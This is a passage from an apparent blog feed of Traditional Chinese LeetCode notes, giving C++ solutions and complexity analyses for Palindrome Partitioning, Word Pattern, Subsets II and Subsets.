class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="type">bool</span> <span class="title">checkPalindrome</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">        string reverseStr = str;</span><br><span class="line">        <span class="built_in">reverse</span>(reverseStr.<span class="built_in">begin</span>(), reverseStr.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> str == reverseStr;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果為 <code>true</code> 那在 <code>partitionHelper</code> 函數中，就可以去將字串加入到子陣列中，並且嘗試下一層，記得在遞回傳入參數時，<strong>要以當前分割處的下一個位置作為下一次嘗試的開頭</strong>，所以 <code>depth</code> 參數要給與 <code>i+1</code></p><p>如果下一次遞回退回，則需要將當子陣列的組合 pop 出來，並且嘗試其他字串組合</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/131/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>對於 <code>partiionHelper</code>來說，執行時間與組合數量成正比，可能的組合數量是 $2^N$，對於長度為 $N$ 的字串，每個字元都有選或不選兩種可能，因此時間複雜度為 $O(2^N)$，而對於 <code>checkpalindrome</code> 來說，會進行字串反轉，反轉得複雜度為 $O(K)$，$K$ 為傳入字串長度，最懷狀礦下 $N&#x3D;K$</p><p>因此整體時間複雜度為  $N*2^N$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>遞回樹深度為 $N$，對於結果的儲存，一共可能有 $2^N$ 總組合數，另外 <code>subList</code> 的空間複雜度為 $O(N)$，因此整體空間複雜度為 $N* 2^N$ </p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
            <tag> Palindrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>字詞模式 | Easy | LeetCode#290. Word Pattern</title>
      <link href="/posts/14d09d4a.html"/>
      <url>/posts/14d09d4a.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/290/question1.jpeg"></p><p><img src="/img/LeetCode/290/question2.jpeg"></p><ul><li>題目難度: <code>Easy</code></li><li>題目描述: 給定字串 <code>pattern</code> 以及 字串 <code>s</code>，檢查 <code>s</code> 是否遵循相同模式</li></ul><p>題目有說明這裡 <strong>相同模式</strong> 的意思: <strong><code>pattern</code> 中的任一字元與 <code>s</code> 中的非空字串完全匹配的 1對1映射關係</strong>，具體來說規則如下:</p><div class="note info flat"><ul><li>在 <code>pattern</code> 中的每個字母，都有明確的對應到 <code>s</code> 中的 unique 字串</li><li>在 <code>s</code> 中的 unique 字串，明確對應到 <code>pattern</code> 中的一個字母</li><li>沒有兩個字母映射到同一個單詞，也沒有兩個單詞映射到同一個字母</li></ul></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這裡想法很單純就是透過 Hash Table 來去建立並儲存映射關係。而在建立過程中可以去檢查當前的字母和對應字串是否已經存在映射關係於 hash table 中，如果有救回傳 <code>false</code>，如果整個 hash table都建立好後都沒有重複的映射關係那就回傳 <code>true</code>。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">wordPattern</span><span class="params">(string pattern, string s)</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">        unordered_map&lt;<span class="type">char</span>, string&gt; umap;</span><br><span class="line">        unordered_map&lt;string, <span class="type">char</span>&gt; umap2;</span><br><span class="line">        vector&lt;string&gt; s_list;</span><br><span class="line">        <span class="function">istringstream <span class="title">iss</span><span class="params">(s)</span></span>;</span><br><span class="line">        string word=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">while</span>(iss &gt;&gt; word)&#123;</span><br><span class="line">            s_list.<span class="built_in">push_back</span>(word);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(pattern.<span class="built_in">size</span>()!= s_list.<span class="built_in">size</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; pattern.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="type">char</span> str = pattern[i];</span><br><span class="line">            string s_word = s_list[i];</span><br><span class="line">            <span class="keyword">if</span>(umap.<span class="built_in">find</span>(str)!=umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="comment">// find key - str  Ex. &quot;a&quot;</span></span><br><span class="line">                <span class="keyword">if</span>(umap[str]!= s_word)&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> umap[str] = s_word;</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(umap2.<span class="built_in">find</span>(s_word)!=umap2.<span class="built_in">end</span>())&#123;</span><br><span class="line">                <span class="keyword">if</span>(umap2[s_word]!= str) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> umap2[s_word] = str;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我們宣告了兩個 <code>unordered_map</code> 分別用於存放 <strong>pattern -&gt; s</strong> 以及 <strong>s -&gt; pattern</strong> 的映射關係:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unordered_map&lt;<span class="type">char</span>, string&gt; umap;</span><br><span class="line">unordered_map&lt;string, <span class="type">char</span>&gt; umap2;</span><br></pre></td></tr></table></figure><p>接著，需要將字串 <code>s</code> 儲存成陣列，這裡透過 <code>std::istringstream</code> 來去依序分割 <code>s</code> 並存放到陣列 <code>s_list</code> 中，</p><div class="note info flat"><p>若要使用 <code>std::istringstream</code>，需要引入標頭 <code>#include &lt;sstream&gt;</code>，宣告方式如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">istringstream iss(s);</span><br></pre></td></tr></table></figure><p>之後透過 while 迴圈以及運算子 <code>&gt;&gt;</code> 就可以將字串導向到宣告來存放子字串的變數中進行處理</p></div><p>接著就是在 <code>pattern</code> 中，依序建構 hash table:</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> str = pattern[i];</span><br><span class="line">string s_word = s_list[i];</span><br><span class="line"><span class="keyword">if</span>(umap.<span class="built_in">find</span>(str)!=umap.<span class="built_in">end</span>())&#123;</span><br><span class="line">    <span class="comment">// find key - str  Ex. &quot;a&quot;</span></span><br><span class="line">    <span class="keyword">if</span>(umap[str]!= s_word)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> umap[str] = s_word;</span><br></pre></td></tr></table></figure><p>一旦沒有在 <code>umap</code> 中找到當前 <code>pattern</code> 中的字母 (Ex. <code>a</code>) 則建立對應關係</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;a&#x27;: &quot;dog&quot;&#125;</span><br></pre></td></tr></table></figure><p>而如果有找到，則需要檢查以　<code>a</code> 為 Key 的對應 Value 是否為當前的 <code>s_word</code>，如果不等於，那就回傳 <code>false</code>，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;a&#x27;: &quot;dog&quot;&#125;</span><br><span class="line"></span><br><span class="line">FIND: A, but S_WORD: cat -&gt; False</span><br></pre></td></tr></table></figure><p>一旦檢查完成後，也就代表 <code>pattern</code> 映射到 <code>s</code> 的關係沒問題。接著就需要檢查 <code>s</code> 到 <code>pattern</code> 的映射關係</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(umap2.<span class="built_in">find</span>(s_word)!=umap2.<span class="built_in">end</span>())&#123;</span><br><span class="line">    <span class="keyword">if</span>(umap2[s_word]!= str) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> umap2[s_word] = str;</span><br></pre></td></tr></table></figure><p>同上，一旦沒有在 <code>uamp2</code> 中找到當前 <code>s_word</code> 中的字串 (Ex. <code>dog</code>) 則建立對應關係</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;dog&quot;: a&#125;</span><br></pre></td></tr></table></figure><p>而如果有找到，則需要檢查以　<code>dog</code> 為 Key 的對應 Value 是否為當前的 <code>str</code> (<code>pattern[i]</code>)，如果不等於，那就回傳 <code>false</code>，例如</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#x27;dog&#x27;: &quot;a&quot;&#125;</span><br><span class="line"></span><br><span class="line">FIND: `dog`, but STR: `b` -&gt; False</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/290/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>分割字串: $O(N)$， $N$ 為字串總長度</li><li>遍歷 <code>pattern</code>: $O(M)$， $m$ 為 <code>pattern</code> 長度，而在迴圈中插入 <code>unordered_map</code> 的操作為 $O(1)$</li></ul><p>因此整體時間複雜度為 $O(N+M)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li><code>s_list</code>: 用於儲存分割的字串，其大小與 <code>s</code> 長度成正比，因此為 $O(N)$， $N$ 為字串總長度</li><li><code>umap</code> &amp;&amp; <code>umap2</code>: 用於儲存對應關係，兩者儲存數量一樣，最多都會有 $M$ 組 key-value pairs，因此為 $O(M)$<br>因此整體空間複雜度為 $O(N+M)$</li></ul><h1 id="結語"><a href="#結語" class="headerlink" title="結語"></a>結語</h1><p>做了這題才開始熟悉在 C++ 當中進行字串分割 (也就是 <code>istringstream</code> 的使用)</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> String </tag>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C++ </tag>
            
            <tag> Hash Table </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子集問題ii | Medium | LeetCode#90. Subsets II</title>
      <link href="/posts/80e799a5.html"/>
      <url>/posts/80e799a5.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/90/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述：給定一個整數陣列 <code>nums</code>， 回傳所有可能的子集，回傳的子集不能重複，但可以任意順序排序</li></ul><div class="note info flat"><p>這題是 <a href="https://leetcode.com/problems/subsets/description/">78.Subsets</a> 的延伸題型，可以看我<a href="https://leozzmc.github.io/posts/3e4bf679.html">這一篇解法</a>，但是這題不同的是，對於 <code>nums</code> 陣列中 <code>[2]</code> 是不等於 <code>[2,2]</code> 的，但 <code>[1,2]</code> 是等於 <code>[2,1]</code> 的，<strong>也就是説對於個別子集來說，若相同元素但元素數量不同則看成不同子集</strong></p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>我的想法就跟上一題差不多，只是想說在添加到回傳陣列時，額外進行檢查，踢除重複的子集。</p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">subsetHelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;nums, vector&lt;<span class="type">int</span>&gt; &amp;cur, <span class="type">int</span> depth)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(depth == nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt; result.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(cur == result[i]) <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            result.<span class="built_in">push_back</span>(cur);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//not pick</span></span><br><span class="line">        <span class="built_in">subsetHelper</span>(nums, cur, depth+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//pick</span></span><br><span class="line">        cur.<span class="built_in">push_back</span>(nums[depth]);</span><br><span class="line">        <span class="built_in">subsetHelper</span>(nums, cur, depth+<span class="number">1</span>);</span><br><span class="line">        cur.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">subsetsWithDup</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums)&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); </span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; cur;</span><br><span class="line">        <span class="built_in">subsetHelper</span>(nums,cur,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡額外說明</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); </span><br></pre></td></tr></table></figure><p>這段的作用是對輸入陣列進行排序，這對於處理重複元素非常重要，<strong>一旦將輸入陣列排序後，所有重複的元素會相鄰排列。我們就可在遞迴處理時能夠輕鬆跳過這些重複元素。</strong> 例如，如果輸入是 <code>[2,1,2]</code>，排序後會變成 <code>[1,2,2]</code>，這樣可以在遞迴中只選擇一組 <code>2</code>，而不會產生重複子集</p><p>如果沒排序產生的子集可能會像是下面這樣</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[]</span><br><span class="line">[2]</span><br><span class="line">[1]</span><br><span class="line">[2]</span><br><span class="line">[2, 1]</span><br><span class="line">[2, 2]</span><br><span class="line">[1, 2]</span><br><span class="line">[2, 1, 2]</span><br></pre></td></tr></table></figure><p>而這裡再將子集加入到回傳陣列前，進行重複檢查</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p>這樣做的執行結果就很爛，畢竟每次產生一種子集前都需要進行 <code>result.size()</code> 次的運算 </p><p><img src="/img/LeetCode/90/result1.jpeg"></p><h2 id="更正後的解法"><a href="#更正後的解法" class="headerlink" title="更正後的解法"></a>更正後的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">subsetHelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp;nums, vector&lt;<span class="type">int</span>&gt; &amp;cur, <span class="type">int</span> depth)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">        result.<span class="built_in">push_back</span>(cur);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=depth; i&lt; nums.<span class="built_in">size</span>(); i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i &gt; depth &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">            cur.<span class="built_in">push_back</span>(nums[i]);</span><br><span class="line">            <span class="built_in">subsetHelper</span>(nums, cur, i+<span class="number">1</span>);</span><br><span class="line">            cur.<span class="built_in">pop_back</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">subsetsWithDup</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums)&#123;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>()); </span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; cur;</span><br><span class="line">        <span class="built_in">subsetHelper</span>(nums,cur,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡更正的地方，這裡改成透過迴圈來控制嘗試組合，這裡 <code>int i=depth</code>  <strong>是為了確保生成的子集是從當前的遞迴層次開始，而不會重複處理之前已經包含在其他子集中的元素</strong> 若設成0 會導致每次遞迴都會從頭重新選擇元素，子集就會重複生成。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (i &gt; depth &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) <span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>這行的邏輯是：如果當前元素 <code>nums[i]</code> 與前一個元素 <code>nums[i-1]</code> 相同，<strong>並且這是第一次出現重複，我們就跳過這個元素的處理，這樣避免生成相同的子集。</strong> 例如，對於 <code>[1, 2, 2]</code>：</p><ul><li>當 <code>i = 2</code> 且 <code>nums[2] == nums[1]</code>（它們都是 2），我們就會跳過這次</li></ul><blockquote><p>上面這步驟也歸功於先前有先對 <code>nums</code> 進行排序</p></blockquote><p>如果通過檢查，則將當前元素加入子集並繼續進行遞迴，而若退回 backtrack 到當前層，則將目前的子集元素 pop出來嘗試下一種可能。</p><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/90/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><p>這裡分析更正後的寫法</p><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>子集的產生： 對於每個元素都有選或不選的兩種可能，因此這裡的複雜度會是 $2^n$，其中$n$ 為 <code>nums</code> 長度</li><li>判斷重複元素：<code>if (i &gt; depth &amp;&amp; nums[i] == nums[i - 1]) continue</code> 並不改變複雜度</li><li>元素排序： $O(n Log n)$</li></ul><p>因此整題時間複雜度為 $O(nLogn + 2^n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><ul><li>遞迴的深度最大為 $n$，即所有元素都加入子集的情況，因此遞迴調用的空間複雜度為 $O(n)$</li><li>一共可能有  $2^n$ 個子集 (選vs不選)</li></ul><p>因此整體空間複雜度會是 $O(n * 2^n)$</p><hr>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> backtracking </tag>
            
            <tag> recursion </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>子集問題 | Medium | LeetCode#78. Subsets</title>
      <link href="/posts/3e4bf679.html"/>
      <url>/posts/3e4bf679.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/78/question.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述:  給定一個具有不重複元素的整數陣列 <code>nums</code>，<strong>回傳所有可能的子集合</strong></li></ul><div class="note info flat"><p>子集會包含空集合，另外，若子集中的元素相同但順序不同，則視為相同子集。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ex. nums = &#123;1,2,3&#125;</span><br><span class="line">[1,2] = [2,1]</span><br><span class="line">[1,3,2] = [3,1,2]</span><br></pre></td></tr></table></figure></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>子集合問題也是典型的 backtracking 問題，它包含了在每個數字中選與不選，因此終止條件會是目前選擇的深度到達題目所給的長度上限就停止，而在每一層中要做的事就是選跟不選，首先是不選，那就會需要直接往往下一層去，到下一層在進行選以及不選，直到到達長度限制。</p><p>假設題目是 <code>nums=&#123;1,2&#125;</code> 則他的樹狀結構會如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">         []</span><br><span class="line">      /      \</span><br><span class="line">   []         [1]</span><br><span class="line">  /  \       /    \</span><br><span class="line">[]   [2]  [1]    [1,2]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; result;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">subsetsHelper</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, vector&lt;<span class="type">int</span>&gt;&amp; current, <span class="type">int</span> depth)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth == nums.<span class="built_in">size</span>())&#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(current);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// No pick</span></span><br><span class="line">        <span class="built_in">subsetsHelper</span>(nums, current, depth+<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// Pick</span></span><br><span class="line">        current.<span class="built_in">push_back</span>(nums[depth]);</span><br><span class="line">        <span class="built_in">subsetsHelper</span>(nums, current, depth+<span class="number">1</span>);</span><br><span class="line">        current.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">subsets</span>(vector&lt;<span class="type">int</span>&gt;&amp; nums)&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; cur;</span><br><span class="line">        <span class="built_in">subsetsHelper</span>(nums, cur, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡透過兩個函數來實現，<code>subsets</code> 和 <code>subsetsHelper</code>，這裡主要透過 <code>subsetsHelper</code> 來完成 backtracking 的主要邏輯。以下是參數說明：</p><ul><li><code>nums</code> 是題目給的陣列</li><li><code>current</code> 用於存放當前的子集</li><li><code>depth</code> 表示目前處於 <code>nums</code> 的第幾層，控制當前考慮數組的哪個元素</li></ul><p>遞迴過程：</p><ul><li>若 <code>depth</code> 等於 <code>nums.size()</code>，說明已經處理完所有數字，把當前子集 <code>current</code> 放入 <code>result</code></li></ul><p>在遞迴過程有兩個分支，分別為: <strong>不選擇當前 <code>depth</code> 所指的數字，即直接進入下一層遞迴</strong> 以及 <strong>選擇當前 <code>depth</code> 所指的數字，將該數字加入 <code>current</code>，再進入下一層遞迴</strong>， 而在遞迴完畢後再將該數字移出（即 backtrack 回上一層狀態）。</p><p>所以按照題目給的範例測資，如果題目上限長度是3，那對應 <code>nums=&#123;1,2,3&#125;</code> 在初始狀況如果連續 三層都不選，最後就會添加空集合到我們的回傳陣列中。</p><p>題目給的 <code>subsets</code> 函數則用於呼叫我們定義的 <code>subsetsHelper</code> 進行 backtracking，之後回傳答案。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/78/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p>對於 <code>nums</code> 來說一共有 $N$ 個元素，所以將一個子集複製到 <code>result</code> 所需的時間為 $O(N)$，另外，每種元素都有選跟不選兩種可能，因此遞迴會進行 $2^N$，因此整體時間複雜度會是 